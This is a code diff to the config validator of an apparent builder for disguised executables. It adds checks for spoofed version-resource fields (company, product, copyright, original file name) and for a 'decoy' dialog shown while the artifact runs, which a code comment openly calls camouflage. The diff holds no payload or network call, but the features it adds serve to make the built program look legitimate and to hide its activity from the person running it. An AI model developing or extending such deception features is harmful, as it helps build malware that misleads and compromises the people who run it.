@@ -35,9 +35,20 @@ from .forge import (
     OUTPUT_EXE,
     OUTPUT_MODES,
     OUTPUT_PY,
+    ForgeError,
+    version_parts,
 )
 from .rename import MAX_NAME_LENGTH, RenameError, sanitize, sanitize_suffix
-from .schema import MAX_BALLAST_MB, RELAY_KINDS, SOURCE_FIELDS, RunConfig
+from .schema import (
+    MAX_BALLAST_MB,
+    MAX_DECOY_SECONDS,
+    MAX_DECOY_TEXT,
+    MAX_VERSION_TEXT,
+    RELAY_KINDS,
+    SOURCE_FIELDS,
+    RunConfig,
+    VersionConfig,
+)
 
 # Twelve is a floor, not a strength claim: PBKDF2 stretches whatever it is given, so
 # the number exists to stop a four-character key being shipped, not to substitute for
@@ -474,6 +485,101 @@ def _check_fuse(fuse: Path | None) -> list[Problem]:
     return []
 
 
+def _check_version(version: VersionConfig, mode: str) -> list[Problem]:
+    """The properties sheet the artifact will show.
+
+    Checked here rather than in ``forge`` for the same reason the icon header is: a
+    version string that cannot be assembled is a form defect, and the form is where it
+    can still be fixed. ``forge`` re-derives the same values and refuses at build time.
+    """
+    problems: list[Problem] = []
+    for name in ("company", "product", "description", "copyright", "original_name"):
+        text = getattr(version, name)
+        if len(text) > MAX_VERSION_TEXT:
+            problems.append(
+                _problem(
+                    RULE_OUTPUT,
+                    f"output.version.{name}",
+                    f"{len(text)} characters, the ceiling is {MAX_VERSION_TEXT}",
+                )
+            )
+        if any(ord(character) < 32 for character in text):
+            problems.append(
+                _problem(
+                    RULE_OUTPUT,
+                    f"output.version.{name}",
+                    "contains a control character",
+                )
+            )
+
+    for name in ("file_version", "product_version"):
+        text = getattr(version, name)
+        if not text:
+            continue
+        try:
+            version_parts(text)
+        except ForgeError as exc:
+            problems.append(_problem(RULE_OUTPUT, f"output.version.{name}", str(exc)))
+
+    if any(
+        (
+            version.company,
+            version.product,
+            version.description,
+            version.copyright,
+            version.original_name,
+            version.file_version,
+            version.product_version,
+        )
+    ) and mode != OUTPUT_EXE:
+        problems.append(
+            _note(RULE_OUTPUT, "output.version", "ignored: a script has no resources")
+        )
+    return problems
+
+
+def _check_decoy(seconds: int, title: str, text: str, mode: str) -> list[Problem]:
+    """The dialog shown while the artifact works."""
+    if seconds < 0 or seconds > MAX_DECOY_SECONDS:
+        return [
+            _problem(
+                RULE_OUTPUT,
+                "output.decoy.seconds",
+                f"expected 0..{MAX_DECOY_SECONDS}, got {seconds}",
+            )
+        ]
+    if seconds == 0:
+        return []
+
+    problems: list[Problem] = []
+    for name, value in (("title", title), ("text", text)):
+        if len(value) > MAX_DECOY_TEXT:
+            problems.append(
+                _problem(
+                    RULE_OUTPUT,
+                    f"output.decoy.{name}",
+                    f"{len(value)} characters, the ceiling is {MAX_DECOY_TEXT}",
+                )
+            )
+        if any(ord(character) < 32 and character not in "\t\n" for character in value):
+            problems.append(
+                _problem(RULE_OUTPUT, f"output.decoy.{name}", "contains a control character")
+            )
+    if not problems and not title.strip() and not text.strip():
+        # A dialog with no title and no text is an empty grey box on somebody's screen
+        # for ten minutes, which is worse camouflage than no dialog at all.
+        problems.append(
+            _problem(
+                RULE_OUTPUT,
+                "output.decoy.title",
+                "a decoy with no title and no text shows an empty box",
+            )
+        )
+    if mode != OUTPUT_EXE:
+        problems.append(_note(RULE_OUTPUT, "output.decoy", "ignored: a script has no window"))
+    return problems
+
+
 def validate(
     cfg: RunConfig,
     *,
@@ -496,6 +602,8 @@ def validate(
         problems += _check_ping(cfg.relay.ping)
         problems += _check_targets(cfg)
         problems += _check_sources(cfg)
+        problems += _check_version(cfg.version, mode)
+        problems += _check_decoy(cfg.decoy_seconds, cfg.decoy_title, cfg.decoy_text, mode)
 
         known_mode = mode in OUTPUT_MODES
         if not known_mode:
